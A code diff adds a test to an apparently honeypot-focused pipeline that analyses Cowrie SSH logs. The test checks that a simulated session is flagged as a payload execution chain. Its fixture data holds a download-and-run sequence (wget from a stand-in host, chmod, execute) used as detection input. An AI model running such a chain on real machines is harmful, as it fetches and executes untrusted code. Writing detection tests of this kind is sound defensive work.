@@ -117,3 +117,88 @@ def test_pipeline_persists_raw_events_and_intelligence_analysis(tmp_path):
     assert analysis["fingerprint"]["session_count"] == 1
     assert analysis["risk_assessment"]["score"] > 0
     assert analysis["recommended_actions"]
+
+
+def test_pipeline_persists_payload_execution_chain_analysis(tmp_path):
+    log_path = tmp_path / "cowrie-sequence.json"
+    storage_path = tmp_path / "sequence-events.jsonl"
+    session_id = "payload-chain-integration-session"
+
+    commands = [
+        "wget http://example.test/payload",
+        "chmod +x payload",
+        "./payload",
+    ]
+
+    raw_events = [
+        {
+            "eventid": "cowrie.session.connect",
+            "timestamp": "2026-10-16T10:00:00+00:00",
+            "session": session_id,
+            "src_ip": "192.0.2.50",
+            "protocol": "ssh",
+        },
+    ]
+
+    for index, command in enumerate(commands, start=1):
+        raw_events.append(
+            {
+                "eventid": "cowrie.command.input",
+                "timestamp": "2026-10-16T10:00:{:02d}+00:00".format(index),
+                "session": session_id,
+                "input": command,
+            }
+        )
+
+    raw_events.append(
+        {
+            "eventid": "cowrie.session.closed",
+            "timestamp": "2026-10-16T10:00:05+00:00",
+            "session": session_id,
+            "duration_ms": 5000,
+        }
+    )
+
+    log_path.write_text(
+        "".join(json.dumps(event) + "\n" for event in raw_events),
+        encoding="utf-8",
+    )
+
+    processed_count = run_cowrie_pipeline(
+        log_path=str(log_path),
+        storage_path=str(storage_path),
+    )
+
+    stored_events = [
+        json.loads(line)
+        for line in storage_path.read_text(encoding="utf-8").splitlines()
+        if line.strip()
+    ]
+
+    analysis_events = [
+        event
+        for event in stored_events
+        if event["event_type"] == "morpheus.intelligence.analysis"
+    ]
+
+    assert processed_count == len(raw_events)
+    assert len(analysis_events) == 1
+
+    analysis = analysis_events[0]["data"]
+
+    chain = next(
+        item
+        for item in analysis["intents"]
+        if item["intent"] == "payload_execution_chain"
+    )
+
+    assert chain["evidence"] == commands
+    assert analysis["session"]["session_id"] == session_id
+
+    assessment = analysis["risk_assessment"]
+    factor_names = {
+        factor["name"] for factor in assessment["factors"]
+    }
+
+    assert "intent_payload_execution_chain" in factor_names
+    assert assessment["score"] >= 30
